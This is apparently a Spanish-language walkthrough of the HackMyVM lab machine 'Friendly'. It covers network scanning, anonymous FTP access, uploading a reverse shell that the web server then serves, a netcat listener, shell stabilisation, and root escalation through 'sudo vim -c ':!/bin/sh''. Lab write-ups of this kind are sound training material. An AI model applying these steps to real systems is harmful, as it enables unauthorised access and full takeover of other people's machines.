# Maquina Friendly B)
![Imagen](https://github.com/Qu0kk4/Qu0kk4/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-04-02%20212326.png)

Realizamos un escaneo de red con arp-scan para ver las maquinas conectadas, luego le lanzamos un ping a la maquina que vamos a comprometer, segun el ttl nos damos cuenta si estamos ante una maquina linux si es ttl 64 o si es un ttl 128 es windows.
>arp-scan -i eth0 --localnet

![Imagen](https://github.com/Qu0kk4/Qu0kk4/blob/main/HackMyVm/image/1.png)

Con nmap utilizamos el siguiente el comando:
>nmap -p --open -A -T5 -O "IP" -oN nombre.txt

![Imagen](https://github.com/Qu0kk4/Qu0kk4/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-04-02%20203501.png)

Vemos que tenemos los puertos 21 "ftp y el 80 "http", lo siguiente es ingresar al servicio ftp ya que podemos loguearnos como anonimo.
Dentro del FTP encontramos un archivo llamado index.html, lo descargamos a nuestra maquina atacante.
>ftp "IP"

![Imagen](https://github.com/Qu0kk4/Qu0kk4/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-04-02%20203448.png)
Ahora vamos al navegador, colocamos la ip y vemos a donde nos redirige la pagina web.

![Imagen](https://github.com/Qu0kk4/Qu0kk4/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-04-02%20204450.png)

Como notamos que el index del ftp coincide con la pagina, lo que podes hacer es subir una RV (ReverShell) al FTP con el comando "PUT".

![Imagen](https://github.com/Qu0kk4/Qu0kk4/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-04-02%20204436.png)

Seguido a eso vamos a ponernos en escucha con netcat 
>nc -nlvp 1234

Luego volvemos a la pagina web y seguido de http://"ip"/ .............. <<<<<< colocamos el nombre de la RV y le damos ENTER.

![Imagen](https://github.com/Qu0kk4/Qu0kk4/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-04-02%20204534.png)

Listo ahora somos el usuarios www-data.

![Imagen](https://github.com/Qu0kk4/Qu0kk4/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-04-02%20204542.png)

Realizamos el tratamiendo de la tty para tener una shell estable.
>script /dev/null -c bash
>crtl Z
>stty raw -echo;fg
>+ continued  nc -nlvp 443
>                             reset
>reset: unknown terminal type unknow
>Terminal type? xterm
>export TERM=xterm
>export SHELL=bash

Buscamos la forma de escalar privilegios para eso utilizamos el comando "sudo -l" y vemos que hay un binario llamado "vim".

![Imagen](https://github.com/Qu0kk4/Qu0kk4/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-04-02%20204702.png)

Nos dirijimos a gtfobins para ver si aca podemos encontrar la forma de explotar el binario "vim". Genial! al parecer si agregamos el siguiente comando podemos acceder a root:
>sudo vim -c ':!/bin/sh'

![Imagen](https://github.com/Qu0kk4/Qu0kk4/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-04-02%20204859.png)

Y listo somos usuario root!

![Imagen](https://github.com/Qu0kk4/Qu0kk4/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-04-02%20204913.png)
